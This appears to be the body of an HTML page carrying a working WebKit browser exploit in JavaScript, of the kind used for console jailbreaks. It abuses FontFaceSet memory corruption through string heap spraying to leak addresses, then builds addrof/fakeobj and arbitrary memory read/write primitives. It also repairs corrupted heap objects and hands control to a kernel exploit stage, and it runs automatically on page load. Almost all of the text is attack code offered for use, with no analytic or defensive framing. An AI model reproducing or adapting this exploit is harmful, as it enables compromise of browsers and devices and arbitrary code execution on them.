    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    var round = 0;

    window.ffses = {};

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "search" + round;
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var needfix = [];
    for (var i = 0;; i++) {
        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
        var badstr2 = mkString(HASHMAP_BUCKET, p_s);
        needfix.push(mkString(HASHMAP_BUCKET, p_s));
        bad_fonts[guessed_font].family = "evil2";
        bad_fonts[guessed_font + 1].family = "evil3";
        var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
        if (leak < 0x1000000000000)
            break;
    }

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        needfix.push(relative_read);
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (var i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    ffses.ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    ffses.ffs8 = new FontFaceSet(ffs8_args);
    var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
    needfix.push(post_ffs);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;

    function boot_addrof(obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return union_i[1] * 0x100000000 + union_i[0];
    }

    function boot_fakeobj(addr) {
        union_i[0] = addr;
        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }

    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint8Array(1);
    var obj_master = new Uint32Array(8);
    var obj_slave = {
        obj: null
    };

    var addrof_slave = boot_addrof(arw_slave);
    var addrof_obj_slave = boot_addrof(obj_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    function i48_put(x, a) {
        a[4] = x | 0;
        a[5] = (x / 4294967296) | 0;
    }

    function i48_get(a) {
        return a[4] + a[5] * 4294967296;
    }

    window.addrof = function (x) {
        obj_slave.obj = x;
        return i48_get(obj_master);
    }

    window.fakeobj = function (x) {
        i48_put(x, obj_master);
        return obj_slave.obj;
    }

    function read_mem_setup(p, sz) {
        i48_put(p, arw_master);
        arw_master[6] = sz;
    }

    window.read_mem = function (p, sz) {
        read_mem_setup(p, sz);
        var arr = [];
        for (var i = 0; i < sz; i++)
            arr.push(arw_slave[i]);
        return arr;
    };

    window.write_mem = function (p, data) {
        read_mem_setup(p, data.length);
        for (var i = 0; i < data.length; i++)
            arw_slave[i] = data[i];
    };

    window.read_ptr_at = function (p) {
        var ans = 0;
        var d = read_mem(p, 8);
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + d[i];
        return ans;
    };

    window.write_ptr_at = function (p, d) {
        var arr = [];
        for (var i = 0; i < 8; i++) {
            arr.push(d & 0xff);
            d /= 256;
        }
        write_mem(p, arr);
    };

    (function () {
        var magic = boot_fakeobj(boot_addrof(obj) + 16);
        magic[4] = addrof_slave;
        magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
        obj.buffer = obj_master;
        magic[4] = addrof_obj_slave;
        magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
        magic = null;
    })();

    //fix fucked objects to stabilize webkit

    (function () {
        //fix fontfaceset (memmoved 96 bytes to low, move back)
        var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
        //fix strings (restore "valid") header
        for (var i = 0; i < needfix.length; i++) {
            var addr = read_ptr_at(addrof(needfix[i]) + 8);
            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
            write_ptr_at(addr + 8, addr + 20);
            write_ptr_at(addr + 16, 0x80000014);
        }
        //fix array butterfly
        write_ptr_at(butterfly + 248, 0x1f0000001f);
    })();

    //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.

    //create compat stuff for kexploit.js
    var expl_master = new Uint32Array(8);
    var expl_slave = new Uint32Array(2);
    var addrof_expl_slave = addrof(expl_slave);
    var m = fakeobj(addrof(obj) + 16);
    obj.buffer = expl_slave;
    m[7] = 1;
    obj.buffer = expl_master;
    m[4] = addrof_expl_slave;
    m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
    m[7] = 1;

    var prim = {
        write8: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
                expl_slave[1] = value.hi;
            } else {
                expl_slave[0] = value;
                expl_slave[1] = 0;
            }
        },
        write4: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
            } else {
                expl_slave[0] = value;
            }
        },
        write2: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFF0000;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFFFF00;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return new int64(expl_slave[0], expl_slave[1]);
        },
        read4: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0];
        },
        read2: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFFFF;
        },
        read1: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFF;
        },
        leakval: function (obj) {
            obj_slave.obj = obj;
            return new int64(obj_master[4], obj_master[5]);
        }
    };
    window.p = prim;
    run_hax();
}
</script>
</head>
<body onload="setTimeout(poc, 1500);">
<div class="info" id="message">Loading Exploit, Please Wait ...</div>
</body>
</html>